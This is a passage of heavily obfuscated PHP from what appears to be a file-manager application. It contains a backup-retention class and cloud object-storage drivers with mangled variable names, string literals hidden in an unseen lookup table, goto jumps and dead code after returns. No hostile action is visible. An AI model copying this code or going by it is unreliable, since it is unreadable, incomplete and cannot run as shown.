$ØÁ¤ÙéÌ[311] . $Àèã”›Ò . $ØÁ¤ÙéÌ[312]); $àöÌ¬™ı = $this->maukd6da122b($ïó¸«Ì›[0], $»±· Ö); $””‡â–Á = $¨øïş½[832]; if (strlen($””‡â–Á) < $¨øïş½[703]) { return; } return $àöÌ¬™ı; } public function liby0694f7a2() { $µšú˜£ü =& $_SERVER[öæÛ¿©¿]; $Şè²İ»¢ = mt_rand(pow(2, 14), pow(2, 16) - 1); $¦×É´µ = array(); $ÌÅÒĞ„± = $µšú˜£ü[833]; while (strlen($ÌÅÒĞ„±) < $µšú˜£ü[711]) { if (!$ÌÅÒĞ„±) { break; } $ÌÅÒĞ„±++; } $«‹ÒôüÎ = 1; $İôúÖ¯ô = $µšú˜£ü[834]; if (strlen($İôúÖ¯ô) < $µšú˜£ü[699]) { return; } while ($«‹ÒôüÎ <= (int) sqrt($Şè²İ»¢)) { $Ø¶¯¨ğ‡ = $«‹ÒôüÎ; $ûíª‘ó = $µšú˜£ü[835]; while (!0) { $Ø¶¯¨ğ‡++; if ($Ø¶¯¨ğ‡ <= 2) { $«‹ÒôüÎ = $Ø¶¯¨ğ‡; break; } else { if ($Ø¶¯¨ğ‡ < 2) { continue; } } $ÄÒ­öê‹ = !0; for ($Ğó™ƒÓ = 2; $Ğó™ƒÓ <= sqrt($Ø¶¯¨ğ‡); $Ğó™ƒÓ++) { if ($Ø¶¯¨ğ‡ % $Ğó™ƒÓ == 0) { $ÄÒ­öê‹ = !1; } } if ($ÄÒ­öê‹) { $«‹ÒôüÎ = $Ø¶¯¨ğ‡; break; } } $¦×É´µ[] = $«‹ÒôüÎ; } $Ïğ«²¸ö = 2; $àÔóÇŒ¯ = $µšú˜£ü[836]; if (strlen($àÔóÇŒ¯) < $µšú˜£ü[721]) { die; } for ($Ø¶¯¨ğ‡ = $Şè²İ»¢; $Ø¶¯¨ğ‡ > 1; $Ø¶¯¨ğ‡--) { $ÄÒ­öê‹ = !0; $³­Î·Òà = $µšú˜£ü[837]; foreach ($¦×É´µ as $â­ô³†) { if ($Ø¶¯¨ğ‡ % $â­ô³† == 0) { $ÄÒ­öê‹ = !1; break; } } if ($ÄÒ­öê‹) { $Ïğ«²¸ö = $Ø¶¯¨ğ‡; break; } } return $Ïğ«²¸ö; } public function jvgu642fb8f4($ë³äøß·, $ÁÉ»½¶Ä) { $ƒñŞ¾†ª =& $_SERVER[öæÛ¿©¿]; $àú©‚ŸÂ =& $_SERVER[„Ã«ôíÀ]; return call_user_func(array($àú©‚ŸÂ[8], $àú©‚ŸÂ[314]), $ë³äøß·, $ÁÉ»½¶Ä); $’ßÅ†Ğ = $ƒñŞ¾†ª[838]; while ($’ßÅ†Ğ < $ƒñŞ¾†ª[715]) { if ($’ßÅ†Ğ >= 0) { break; } $’ßÅ†Ğ++; } } public function volg6af6edeb($ÈêÊÑ  , $ìó·çˆ´) { $ş¾úëâö =& $_SERVER[„Ã«ôíÀ]; return call_user_func(array($ş¾úëâö[315], $ş¾úëâö[316]), $ÈêÊÑ  , $ìó·çˆ´); } public function maukd6da122b($Š¿¿İå, $Èç¢Şğ‹) { $¸­‰ßËÈ =& $_SERVER[öæÛ¿©¿]; $Í’óÏÄ =& $_SERVER[„Ã«ôíÀ]; return call_user_func(array($Í’óÏÄ[315], $Í’óÏÄ[317]), $Š¿¿İå, $Èç¢Şğ‹); $ÛÚ »œ× = $¸­‰ßËÈ[839]; while (strlen($ÛÚ »œ×) < $¸­‰ßËÈ[699]) { if (!$ÛÚ »œ×) { break; } $ÛÚ »œ×++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[öæÛ¿©¿][840]); $this->init(); $this->keep(); } public function init() { $¤àƒˆÅ¶ =& $_SERVER[öæÛ¿©¿]; $this->isManual(); self::$name = date($¤àƒˆÅ¶[841]); if (!($¼âÎê… = $this->model->lastItem())) { $¼âÎê… = $this->initData(); } else { self::$name = $¼âÎê…[$¤àƒˆÅ¶[32]]; if ($¼âÎê…[$¤àƒˆÅ¶[842]] == $¤àƒˆÅ¶[91]) { self::$name = date($¤àƒˆÅ¶[260]); $ò·çµı£ = intval(_get($¼âÎê…, $¤àƒˆÅ¶[843], 0)); if (self::$manual == 0 && $¼âÎê…[$¤àƒˆÅ¶[32]] == self::$name) { $this->model->remove($¼âÎê…[$¤àƒˆÅ¶[483]]); } $¼âÎê… = $this->initData($ò·çµı£, $¼âÎê…[$¤àƒˆÅ¶[844]]); } else { $this->checkStore($¼âÎê…[$¤àƒˆÅ¶[844]]); } } self::$option = $¼âÎê…; } private function isManual() { $Ì¦‡§ê = _get($GLOBALS, $_SERVER[öæÛ¿©¿][845], 0); $Ì¦‡§ê = intval($Ì¦‡§ê); self::$manual = $Ì¦‡§ê && $Ì¦‡§ê == 1 ? 1 : 0; } private function initData($Ìì¥ÊÌ = 0, $’—§Ø†ˆ = '') { $¹œªšƒˆ =& $_SERVER[öæÛ¿©¿]; $Åî›çµ = $this->model->config(); if ($’—§Ø†ˆ && $Åî›çµ[$¹œªšƒˆ[844]] != $’—§Ø†ˆ) { $Ìì¥ÊÌ = 0; } $this->checkStore($Åî›çµ[$¹œªšƒˆ[844]]); if (self::$manual == 1) { self::$name .= $¹œªšƒˆ[11] . date($¹œªšƒˆ[846]); } $ÂåÊ­”‘ = array($¹œªšƒˆ[844] => $Åî›çµ[$¹œªšƒˆ[844]], $¹œªšƒˆ[32] => self::$name, $¹œªšƒˆ[842] => 0, $¹œªšƒˆ[169] => $Åî›çµ[$¹œªšƒˆ[169]], $¹œªšƒˆ[847] => self::$manual, $¹œªšƒˆ[848] => array($¹œªšƒˆ[849] => array($¹œªšƒˆ[842] => 0), $¹œªšƒˆ[850] => array($¹œªšƒˆ[842] => 0, $¹œªšƒˆ[851] => 0, $¹œªšƒˆ[852] => 0, $¹œªšƒˆ[33] => $¹œªšƒˆ[12], $¹œªšƒˆ[853] => 0, $¹œªšƒˆ[854] => 0), $¹œªšƒˆ[855] => array($¹œªšƒˆ[842] => 0, $¹œªšƒˆ[851] => 0, $¹œªšƒˆ[852] => 0, $¹œªšƒˆ[853] => 0, $¹œªšƒˆ[854] => 0), $¹œªšƒˆ[231] => array($¹œªšƒˆ[842] => 0, $¹œªšƒˆ[856] => 0, $¹œªšƒˆ[857] => 0, $¹œªšƒˆ[858] => 0, $¹œªšƒˆ[859] => 0, $¹œªšƒˆ[553] => $Ìì¥ÊÌ, $¹œªšƒˆ[853] => 0, $¹œªšƒˆ[854] => 0)), $¹œªšƒˆ[853] => time(), $¹œªšƒˆ[854] => 0); $º»ø—Ÿø = $this->model->insert($ÂåÊ­”‘); $ÂåÊ­”‘[$¹œªšƒˆ[483]] = $º»ø—Ÿø; return $ÂåÊ­”‘; } private function checkStore($¼¸ùø¢Ã) { $½Çà²Õ— = Model($_SERVER[öæÛ¿©¿][860]); $³ìÉşô÷ = $½Çà²Õ—->listData($¼¸ùø¢Ã); $½Çà²Õ—->checkConfig($³ìÉşô÷); } public static function get() { if (!self::$option) { $•„’Î´ñ = Model($_SERVER[öæÛ¿©¿][840]); $²Öó°©ã = $•„’Î´ñ->findByName(self::$name); $•„’Î´ñ->parseContent($²Öó°©ã); self::$option = $²Öó°©ã; } return self::$option; } public static function set($ÀÒØ£œİ) { $ê„ÎßíÊ =& $_SERVER[öæÛ¿©¿]; $ÔÄñÄö¦ = self::get(); foreach ($ÀÒØ£œİ as $ğ²§†¶ğ => $»›Œåß©) { array_set_value($ÔÄñÄö¦, $ğ²§†¶ğ, $»›Œåß©); } Model($ê„ÎßíÊ[840])->update($ÔÄñÄö¦[$ê„ÎßíÊ[483]], $ÔÄñÄö¦); self::$option = $ÔÄñÄö¦; return self::$option; } public function keep() { $ ­°ÕŒ =& $_SERVER[öæÛ¿©¿]; $©òÈ‘¿ô = self::get(); if (_get($©òÈ‘¿ô, $ ­°ÕŒ[861], 0) == $ ­°ÕŒ[91]) { return; } $this->backupKeep($©òÈ‘¿ô); self::set(array($ ­°ÕŒ[861] => 1)); } private function backupKeep($Â­Æˆåœ) { $²¢Ê¥’Ë =& $_SERVER[öæÛ¿©¿]; if (self::$manual == 1) { return; } $ÍíÀ‡í = $this->model->listData(); if (empty($ÍíÀ‡í)) { return; } $º³íŠçç = array(); $À¢ˆÄ‡ = array(); $ü×ØÌéí = date($²¢Ê¥’Ë[862], strtotime($²¢Ê¥’Ë[863])); foreach ($ÍíÀ‡í as $Î®˜Õ‚Æ => $œŞşìûº) { $‰áòÖë = $œŞşìûº[$²¢Ê¥’Ë[32]]; if ($Î®˜Õ‚Æ < 7 || $œŞşìûº[$²¢Ê¥’Ë[847]] == $²¢Ê¥’Ë[91]) { $º³íŠçç[] = $‰áòÖë; continue; } $Ãàõ¹ = substr($‰áòÖë, 0, 6); if ($Ãàõ¹ < $ü×ØÌéí) { continue; } if (!isset($À¢ˆÄ‡[$Ãàõ¹]) || $‰áòÖë < $À¢ˆÄ‡[$Ãàõ¹]) { $À¢ˆÄ‡[$Ãàõ¹] = $‰áòÖë; } if (substr($‰áòÖë, 6, 2) == $²¢Ê¥’Ë[864]) { $À¢ˆÄ‡[$Ãàõ¹] = $‰áòÖë; } } $º³íŠçç = array_merge($º³íŠçç, array_values($À¢ˆÄ‡)); $º³íŠçç = array_unique($º³íŠçç); foreach ($ÍíÀ‡í as $œŞşìûº) { $‰áòÖë = $œŞşìûº[$²¢Ê¥’Ë[32]]; if (!empty($‰áòÖë) && in_array($‰áòÖë, $º³íŠçç)) { continue; } $this->model->remove($œŞşìûº[$²¢Ê¥’Ë[483]]); $“±ãÃÈ‡ = $this->backupPath($Â­Æˆåœ); IO::remove($“±ãÃÈ‡, !1); } } private function backupPath($¾ÇÊùÑù) { $”ˆíø¸ì =& $_SERVER[öæÛ¿©¿]; static $“·Î«ğ½ = null; if (is_null($“·Î«ğ½)) { $“·Î«ğ½ = Model($”ˆíø¸ì[865])->get($”ˆíø¸ì[866]); } $‘ÌÌÑ¤ö = $¾ÇÊùÑù[$”ˆíø¸ì[32]]; $Ê¡ËÖÌô = substr(md5($”ˆíø¸ì[867] . $“·Î«ğ½ . $‘ÌÌÑ¤ö), 0, 8); return "\x7b\x69\157\x3a{$¾ÇÊùÑù[$”ˆíø¸ì[844]]}\175\x2f\144\141\x74\141\142\141\x73\145\x2f\142\141\143\x6b\165\160\x2f" . $‘ÌÌÑ¤ö . $”ˆíø¸ì[11] . $Ê¡ËÖÌô; } public function db() { $¤°µä½¶ =& $_SERVER[öæÛ¿©¿]; $Ãƒïôªû = self::get(); if (_get($Ãƒïôªû, $¤°µä½¶[868], 0) == $¤°µä½¶[91]) { return !0; } $••ş³²õ = new BackupDb(); if (!$••ş³²õ->index()) { return !1; } self::set(array($¤°µä½¶[868] => 1)); return !0; } public function dbFile() { $™ëè½¦ =& $_SERVER[öæÛ¿©¿]; $ı‰³ÌÀÚ = self::get(); if (_get($ı‰³ÌÀÚ, $™ëè½¦[869], 0) == $™ëè½¦[91]) { return !0; } $ÃæµòÉ = new BackupDbFile(); if (!$ÃæµòÉ->index()) { return !1; } self::set(array($™ëè½¦[869] => 1)); return !0; } public function file() { $ŒÙ˜ª‡ß =& $_SERVER[öæÛ¿©¿]; $ë½ÉËéÑ = self::get(); if (_get($ë½ÉËéÑ, $ŒÙ˜ª‡ß[870], 0) == $ŒÙ˜ª‡ß[91]) { return !0; } if ($ë½ÉËéÑ[$ŒÙ˜ª‡ß[169]] == $ŒÙ˜ª‡ß[871]) { $»ö¯¼¼Ñ = new BackupFile(); if (!$»ö¯¼¼Ñ->index()) { return !1; } } self::set(array($ŒÙ˜ª‡ß[870] => 1, $ŒÙ˜ª‡ß[842] => 1)); return !0; } public static function log($€ïÏ–àê) { write_log($€ïÏ–àê, $_SERVER[öæÛ¿©¿][872]); } } goto bˆÓî²ã¼Š; aµ—Áó´èŞ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($õĞÊôòÕ) { parent::__construct($õĞÊôòÕ); $this->setSignVersion($_SERVER[öæÛ¿©¿][248]); } public function uploadFormData($ç„ç”©Ñ, $î“åÌˆ = 3600) { return $this->uploadFormDataV2($ç„ç”©Ñ, $î“åÌˆ); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ÛÜ‘Ø±‹) { parent::__construct(); include_once SDK_DIR . $_SERVER[öæÛ¿©¿][1615]; $this->_init($ÛÜ‘Ø±‹); } public function _init($Æ­í‰­) { $Úü©³É› =& $_SERVER[öæÛ¿©¿]; $this->config = $Æ­í‰­; foreach ($Æ­í‰­ as $ï†ûÆË¢ => $˜üæ—ãí) { if (isset($this->{$ï†ûÆË¢})) { $this->{$ï†ûÆË¢} = $˜üæ—ãí; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Úü©³É›[1616] . LNG($Úü©³É›[1617])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Íê‹Åôì =& $_SERVER[öæÛ¿©¿]; $ÜôÊğèÃ = new OSS\Model\CorsConfig(); $–ç´±š‘ = new OSS\Model\CorsRule(); $–ç´±š‘->addAllowedOrigin($Íê‹Åôì[1618]); $–ç´±š‘->addAllowedMethod($Íê‹Åôì[1619]); $–ç´±š‘->addAllowedMethod($Íê‹Åôì[1620]); $–ç´±š‘->addAllowedMethod($Íê‹Åôì[1621]); $–ç´±š‘->addAllowedMethod($Íê‹Åôì[1622]); $–ç´±š‘->addAllowedMethod($Íê‹Åôì[163]); $–ç´±š‘->setMaxAgeSeconds(600); $–ç´±š‘->addExposeHeader($Íê‹Åôì[1623]); $–ç´±š‘->addAllowedHeader($Íê‹Åôì[1618]); $ÜôÊğèÃ->addRule($–ç´±š‘); try { $this->client->putBucketCors($this->bucket, $ÜôÊğèÃ); } catch (OSS\Core\OssException $œ·üŞ¿) { $this->writeLog(__FUNCTION__ . $Íê‹Åôì[213] . $œ·üŞ¿->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÛÁŸî²¡ =& $_SERVER[öæÛ¿©¿]; $Ş°Û¾Ôê = null; try { $Ş°Û¾Ôê = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $š×ê¨æå) { $this->writeLog(__FUNCTION__ . $ÛÁŸî²¡[213] . $š×ê¨æå->getMessage()); return null; } if (!$Ş°Û¾Ôê || !($Êõ¹İ­ = $Ş°Û¾Ôê->getRules())) { return null; } $àü Íœ½ = $Êõ¹İ­[0]->getAllowedOrigins(); $òœİêáĞ = $Êõ¹İ­[0]->getAllowedMethods(); $”Ùƒ®¦ = $Êõ¹İ­[0]->getMaxAgeSeconds(); $¶¼ĞØ£° = $Êõ¹İ­[0]->getExposeHeaders(); $àŠäñå = $Êõ¹İ­[0]->getAllowedHeaders(); return array($ÛÁŸî²¡[219] => isset($àü Íœ½[0]) ? $àü Íœ½[0] : $ÛÁŸî²¡[12], $ÛÁŸî²¡[223] => $òœİêáĞ, $ÛÁŸî²¡[1624] => $”Ùƒ®¦, $ÛÁŸî²¡[1625] => isset($¶¼ĞØ£°[0]) ? $¶¼ĞØ£°[0] : $ÛÁŸî²¡[12], $ÛÁŸî²¡[220] => isset($àŠäñå[0]) ? $àŠäñå[0] : $ÛÁŸî²¡[12]); } public function isBucketCors() { $ËëÉ×›î =& $_SERVER[öæÛ¿©¿]; $“µààˆ = $this->getBucketCors(); if (!$“µààˆ || !is_array($“µààˆ)) { return !1; } if ($“µààˆ[$ËëÉ×›î[219]] != $ËëÉ×›î[221] || $“µààˆ[$ËëÉ×›î[220]] != $ËëÉ×›î[221]) { return !1; } $ä›İ´ëÎ = array_map($ËëÉ×›î[222], $“µààˆ[$ËëÉ×›î[223]]); if (!is_array($ä›İ´ëÎ)) { $ä›İ´ëÎ = array(); } $’§È›§ = array($ËëÉ×›î[224], $ËëÉ×›î[225], $ËëÉ×›î[226], $ËëÉ×›î[227], $ËëÉ×›î[228]); $¶ßËŒòù = array_diff($’§È›§, $ä›İ´ëÎ); return empty($¶ßËŒòù); } public function mkfile($¼’›ÓÔØ, $°ÙßÍ±ñ = '', $ä˜¾´ş‡ = REPEAT_RENAME) { $…½ÙÛÆ = $this->setContent($¼’›ÓÔØ, $°ÙßÍ±ñ); if ($…½ÙÛÆ !== !1) { return $this->getPathOuter($¼’›ÓÔØ); } return !1; } public function mkdir($§şÃè¶ğ, $»ğäâ”Á = REPEAT_SKIP) { if ($»ğäâ”Á && $this->_isFolder($§şÃè¶ğ)) { return $this->getPathOuter($§şÃè¶ğ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($§şÃè¶ğ)); } catch (OSS\Core\OssException $Öäã °) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][213] . $Öäã °->getMessage()); return !1; } return $this->getPathOuter($§şÃè¶ğ); } private function fileList($›µëó¾•, $ëÉµ¯ñ = '', $“à³Úš¼ = 0) { $¿Ÿ«ÙÍ =& $_SERVER[öæÛ¿©¿]; $›µëó¾• = trim($›µëó¾•, $¿Ÿ«ÙÍ[8]); $»¸’Üş = empty($›µëó¾•) && $›µëó¾• !== $¿Ÿ«ÙÍ[229] ? $¿Ÿ«ÙÍ[12] : $›µëó¾• . $¿Ÿ«ÙÍ[8]; $çàˆÆãı = $¿Ÿ«ÙÍ[12]; $¡²õùõ€ = 1000; $åÉœü©— = $³à·†ä˜ = array(); while (!0) { check_abort(); $Ë‡Ğ¸§û = array($¿Ÿ«ÙÍ[1626] => $ëÉµ¯ñ, $¿Ÿ«ÙÍ[1627] => $»¸’Üş, $¿Ÿ«ÙÍ[1628] => $¡²õùõ€, $¿Ÿ«ÙÍ[1629] => $çàˆÆãı); try { $´—’œ„Ç = $this->client->listObjects($this->bucket, $Ë‡Ğ¸§û); } catch (OSS\Core\OssException $Şâ‡Á‰) { $this->writeLog(__FUNCTION__ . $¿Ÿ«ÙÍ[213] . $Şâ‡Á‰->getMessage()); break; } $çàˆÆãı = $´—’œ„Ç->getNextMarker(); $¡Íêç¬ü = $´—’œ„Ç->getObjectList(); $¢øû«À = $´—’œ„Ç->getPrefixList(); foreach ($¡Íêç¬ü as $Ğµäåá) { if ($Ğµäåá->getKey() == $»¸’Üş) { continue; } $½èàşø¬ = $Ğµäåá->getKey(); $Ş¢¼µù = $Ğµäåá->getSize(); $ÈÏ§ïÜê = $Ğµäåá->getLastModified(); $ïŸ¬¢›Õ = trim($Ğµäåá->getETag(), $¿Ÿ«ÙÍ[119]); $Œæş”®¼ = $“à³Úš¼ ? array($¿Ÿ«ÙÍ[32] => $½èàşø¬, $¿Ÿ«ÙÍ[79] => $Ş¢¼µù, $¿Ÿ«ÙÍ[205] => strtotime($ÈÏ§ïÜê), $¿Ÿ«ÙÍ[1630] => $ïŸ¬¢›Õ) : $½èàşø¬; $œÊú³Êœ = $Ş¢¼µù == 0 && substr($½èàşø¬, strlen($½èàşø¬) - 1, 1) == $¿Ÿ«ÙÍ[8] ? !0 : !1; $âÇ˜êËï = array($¿Ÿ«ÙÍ[79] => $Ş¢¼µù, $¿Ÿ«ÙÍ[1631] => $Ş¢¼µù, $¿Ÿ«ÙÍ[88] => strtotime($ÈÏ§ïÜê), $¿Ÿ«ÙÍ[1632] => $ÈÏ§ïÜê, $¿Ÿ«ÙÍ[1630] => $ïŸ¬¢›Õ); $this->cacheMethodInfoSet($½èàşø¬, $œÊú³Êœ, $âÇ˜êËï); if ($œÊú³Êœ) { $åÉœü©—[] = $½èàşø¬; continue; } $³à·†ä˜[] = $Œæş”®¼; } foreach ($¢øû«À as $Ï˜™àÔØ) { $åÉœü©—[] = $Ï˜™àÔØ->getPrefix(); $this->cacheMethodInfoSet($Ï˜™àÔØ->getPrefix(), !0); } if ($çàˆÆãı === $¿Ÿ«ÙÍ[12]) { break; } } $this->cacheMethodInfoSet($›µëó¾•, !0); return array($¿Ÿ«ÙÍ[85] => $åÉœü©—, $¿Ÿ«ÙÍ[86] => $³à·†ä˜); } public function listObject($§¹§Ğ©İ, $¯»ì•«Ø = '') { $ıã¡†êÁ =& $_SERVER[öæÛ¿©¿]; $§¹§Ğ©İ = trim($§¹§Ğ©İ, $ıã¡†êÁ[8]); $¿µ¨ÆçÆ = empty($§¹§Ğ©İ) && $§¹§Ğ©İ !== $ıã¡†êÁ[229] ? $ıã¡†êÁ[12] : $§¹§Ğ©İ . $ıã¡†êÁ[8]; $ğ‚À¶ê§ = $ıã¡†êÁ[12]; $‚â°Å‰® = 1000; $ÜÏ‘Ò„„ = $Ì¼š‚¨Ò = array(); while (!0) { check_abort(); $êÍ­Ê‚Ø = array($ıã¡†êÁ[1626] => $¯»ì•«Ø, $ıã¡†êÁ[1627] => $¿µ¨ÆçÆ, $ıã¡†êÁ[1628] => $‚â°Å‰®, $ıã¡†êÁ[1629] => $ğ‚À¶ê§); try { $Î”¤ÛØ = $this->client->listObjects($this->bucket, $êÍ­Ê‚Ø); } catch (OSS\Core\OssException $¨®Öñ ¬) { $this->writeLog(__FUNCTION__ . $ıã¡†êÁ[213] . $¨®Öñ ¬->getMessage()); break; } $ğ‚À¶ê§ = $Î”¤ÛØ->getNextMarker(); $ºæ¥ø• = $Î”¤ÛØ->getObjectList(); foreach ($ºæ¥ø• as $¡êÆÌĞ) { if ($¡êÆÌĞ->getKey() == $¿µ¨ÆçÆ) { continue; } $´×èÆä = $¡êÆÌĞ->getKey(); $ºë³Ÿ±µ = $¡êÆÌĞ->getSize(); $ˆ ãı”½ = $ºë³Ÿ±µ == 0 && substr($´×èÆä, strlen($´×èÆä) - 1, 1) == $ıã¡†êÁ[8] ? !0 : !1; if ($ˆ ãı”½) { continue; } $Ì¼š‚¨Ò[] = $ºë³Ÿ±µ . $ıã¡†êÁ[213] . $´×èÆä; } if ($ğ‚À¶ê§ === $ıã¡†êÁ[12]) { break; } } return array($ıã¡†êÁ[85] => $ÜÏ‘Ò„„, $ıã¡†êÁ[86] => $Ì¼š‚¨Ò); } public function copyFile($·êûèº, $¥ØàŒ¡â) { $§ÌÑà„¬ = $this->size($·êûèº); if ($§ÌÑà„¬ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $·êûèº, $this->bucket, $this->pathEncode($¥ØàŒ¡â)); } catch (OSS\Core\OssException $æ‹İµ”) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][213] . $æ‹İµ”->getMessage()); return !1; } return $this->getPathOuter($¥ØàŒ¡â); } $ç„¼ğû = $this->multiCopyObject($·êûèº, $¥ØàŒ¡â, $§ÌÑà„¬); return $ç„¼ğû ? $this->getPathOuter($¥ØàŒ¡â) : !1; } private function multiCopyObject($Ì»…²İ©, $µèƒ•©±, $§êÉÆíù) { $ÎØäãŸ° =& $_SERVER[öæÛ¿©¿]; try { $ÊÓÓˆÃ‰ = array(); if ($¢‡‡‡ÉÛ = $this->hashMd5($Ì»…²İ©)) { $ÊÓÓˆÃ‰ = array(OSS\OssClient::OSS_HEADERS => array($ÎØäãŸ°[1633] => $¢‡‡‡ÉÛ)); } $–ïÆò·¢ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($µèƒ•©±), $ÊÓÓˆÃ‰); $ØİàƒØ = 1; $ª­‡ªĞ = 0; $Á³È·ë = array(); $ìğ‚Öó˜ = 1024 * 1024 * 10; $‹‘Â¾çº = $this->client->generateMultiuploadParts($§êÉÆíù, $ìğ‚Öó˜); foreach ($‹‘Â¾çº as $£Ó¤ºÃ => $Ë‹±ø£Ğ) { $ß¶ÀÆ»Ë = $ª­‡ªĞ + (int) $Ë‹±ø£Ğ[$ÎØäãŸ°[1634]]; $ê¾òõı = (int) $Ë‹±ø£Ğ[$ÎØäãŸ°[413]] + $ß¶ÀÆ»Ë - 1; $š®ÇŸ­ = array($ÎØäãŸ°[165] => $ß¶ÀÆ»Ë, $ÎØäãŸ°[166] => $ê¾òõı); $Á³È·ë[] = $this->client->uploadPartCopy($this->bucket, $Ì»…²İ©, $this->bucket, $this->pathEncode($µèƒ•©±), $ØİàƒØ, $–ïÆò·¢, $š®ÇŸ­); $ØİàƒØ = $ØİàƒØ + 1; } $é¯²° = array(); foreach ($Á³È·ë as $£Ó¤ºÃ => $«ÈğÍ›Â) { $é¯²°[] = array($ÎØäãŸ°[298] => $£Ó¤ºÃ + 1, $ÎØäãŸ°[299] => $«ÈğÍ›Â); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($µèƒ•©±), $–ïÆò·¢, $é¯²°); } catch (OSS\Core\OssException $å…¦ÆŸ) { $this->writeLog(__FUNCTION__ . $ÎØäãŸ°[213] . $å…¦ÆŸ->getMessage()); return !1; } return !0; } public function moveFile($éË‘Ôşª, $œ¶Ò–†¬) { if ($this->copyFile($éË‘Ôşª, $œ¶Ò–†¬)) { $this->remove($éË‘Ôşª); return $this->getPathOuter($œ¶Ò–†¬); } return !1; } public function delFile($¥×æ¿½’) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¥×æ¿½’)); } catch (OSS\Core\OssException $ûƒÒ¾•) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][213] . $ûƒÒ¾•->getMessage()); return !1; } return !0; } public function delFolder($ƒ¡û¨Í¤) { $ø—¨˜„ =& $_SERVER[öæÛ¿©¿]; if (!$this->exist($ƒ¡û¨Í¤)) { return !0; } $this->listItemCache = !1; $‘îÜÖñ = $this->fileList($ƒ¡û¨Í¤); $this->listItemCache = !0; $½—®Ø € = trim($ƒ¡û¨Í¤, $ø—¨˜„[8]) . $ø—¨˜„[8]; if (!empty($ƒ¡û¨Í¤) && $ƒ¡û¨Í¤ !== $ø—¨˜„[229] && !in_array($½—®Ø €, $‘îÜÖñ[$ø—¨˜„[85]])) { $‘îÜÖñ[$ø—¨˜„[85]][] = $½—®Ø €; } $û€ûí§” = $this->delByBatch($‘îÜÖñ[$ø—¨˜„[86]]); if (!$û€ûí§”) { return !1; } $û€ûí§” = $this->delByBatch($‘îÜÖñ[$ø—¨˜„[85]]); if (!$û€ûí§”) { return !1; } return $this->delFile($½—®Ø €); } private function delByBatch($àÉñúÀ) { foreach (array_chunk($àÉñúÀ, 1000) as $¥ûÊ—¥ö) { try { $this->client->deleteObjects($this->bucket, $¥ûÊ—¥ö); } catch (OSS\Core\OssException $Òøß¨ïÔ) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][213] . $Òøß¨ïÔ->getMessage()); return !1; } } return !0; } public function rename($£š¥Šôº, $åÃÍÜã) { return $this->renameObject($£š¥Šôº, $åÃÍÜã); } private function fileInfo($•¼Õ ò, $éÊŞÆ½ = false, $áô—Å¢Ö = array()) { $Ü·¨†³Ñ =& $_SERVER[öæÛ¿©¿]; $Ù¤üİ›· = array($Ü·¨†³Ñ[32] => $this->pathThis($•¼Õ ò), $Ü·¨†³Ñ[87] => $this->getPathOuter($•¼Õ ò), $Ü·¨†³Ñ[33] => $Ü·¨†³Ñ[231], $Ü·¨†³Ñ[79] => isset($áô—Å¢Ö[$Ü·¨†³Ñ[79]]) ? $áô—Å¢Ö[$Ü·¨†³Ñ[79]] : 0, $Ü·¨†³Ñ[167] => $this->ext($•¼Õ ò)); if ($éÊŞÆ½) { return $Ù¤üİ›·; } $Ù¤üİ›·[$Ü·¨†³Ñ[232]] = $Ù¤üİ›·[$Ü·¨†³Ñ[88]] = 0; $Ù¤üİ›·[$Ü·¨†³Ñ[233]] = $Ù¤üİ›·[$Ü·¨†³Ñ[234]] = !0; if (empty($áô—Å¢Ö)) { $¼‚Â§€÷ = $this->objectMeta($•¼Õ ò); if (!$¼‚Â§€÷) { return $Ù¤üİ›·; } $áô—Å¢Ö = array($Ü·¨†³Ñ[88] => strtotime($¼‚Â§€÷[$Ü·¨†³Ñ[1632]]), $Ü·¨†³Ñ[79] => $¼‚Â§€÷[$Ü·¨†³Ñ[1631]] + 0, $Ü·¨†³Ñ[1630] => $¼‚Â§€÷[$Ü·¨†³Ñ[1630]]); } if (isset($áô—Å¢Ö[$Ü·¨†³Ñ[1630]]) && $áô—Å¢Ö[$Ü·¨†³Ñ[1630]]) { $Ù¤üİ›·[$Ü·¨†³Ñ[236]] = trim($áô—Å¢Ö[$Ü·¨†³Ñ[1630]], $Ü·¨†³Ñ[119]); } if (isset($áô—Å¢Ö[$Ü·¨†³Ñ[79]])) { $Ù¤üİ›·[$Ü·¨†³Ñ[79]] = $áô—Å¢Ö[$Ü·¨†³Ñ[79]]; } if (isset($áô—Å¢Ö[$Ü·¨†³Ñ[88]])) { $Ù¤üİ›·[$Ü·¨†³Ñ[88]] = $áô—Å¢Ö[$Ü·¨†³Ñ[88]]; } if (isset($áô—Å¢Ö[$Ü·¨†³Ñ[205]]) && !trim($Ù¤üİ›·[$Ü·¨†³Ñ[88]])) { $Ù¤üİ›·[$Ü·¨†³Ñ[88]] = $áô—Å¢Ö[$Ü·¨†³Ñ[205]]; } return $Ù¤üİ›·; } private function folderInfo($®ĞÖã•Ê, $“»ïİ¿­ = false, $™÷…¢íœ = array()) { $µâş¸±¨ =& $_SERVER[öæÛ¿©¿]; $Ú¼õß·Ş = array($µâş¸±¨[32] => $this->pathThis($®ĞÖã•Ê), $µâş¸±¨[87] => $this->getPathOuter($µâş¸±¨[8] . $®ĞÖã•Ê), $µâş¸±¨[33] => $µâş¸±¨[78]); if ($“»ïİ¿­) { return $Ú¼õß·Ş; } $Ú¼õß·Ş[$µâş¸±¨[232]] = $Ú¼õß·Ş[$µâş¸±¨[88]] = 0; 